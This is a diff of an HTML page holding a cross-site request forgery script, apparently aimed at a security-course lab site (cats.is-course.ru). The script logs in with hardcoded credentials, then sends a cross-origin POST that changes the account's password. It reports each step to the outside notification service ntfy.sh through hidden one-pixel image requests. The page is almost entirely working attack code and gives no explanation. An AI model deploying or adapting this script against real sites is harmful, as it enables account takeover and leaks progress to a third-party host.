@@ -1,14 +1,13 @@
-<!doctype html><html><head><meta charset="utf-8"><title>self</title></head><body>
+<!doctype html><html><head><meta charset="utf-8"><title>self2</title></head><body>
 <script>
-var U="catsself1795229002", B="https://cats.is-course.ru", NP="Self9!cookietest";
+var U="catsself21795229129", B="https://cats.is-course.ru", NP="Self9!cookietest2";
 function b(n){var i=document.createElement("img");i.width=1;i.height=1;
   i.src="https://ntfy.sh/"+U+"/trigger?message="+encodeURIComponent(n);document.body.appendChild(i);}
 function post(u,body){return fetch(B+u,{method:"POST",mode:"no-cors",credentials:"include",cache:"no-store",
   headers:{"Content-Type":"application/x-www-form-urlencoded"},body:body});}
-b("s_start");
+b("q_start");
 post("/login","login=freshtrlms&password=Qq1%21zzzzzzzzzz")
- .then(function(){b("s_a_login"); return new Promise(function(r){setTimeout(r,300);});})
- .then(function(){return post("/settings","password="+encodeURIComponent(NP)+"&confirm-password="+encodeURIComponent(NP));})
- .then(function(){b("s_b_settings");})
- .catch(function(e){b("s_err_"+e.name);});
+ .then(function(){b("q_loggedin"); return post("/settings","password="+encodeURIComponent(NP)+"&confirm-password="+encodeURIComponent(NP));})
+ .then(function(){b("q_set_done");})
+ .catch(function(e){b("q_err_"+e.name);});
 </script></body></html>
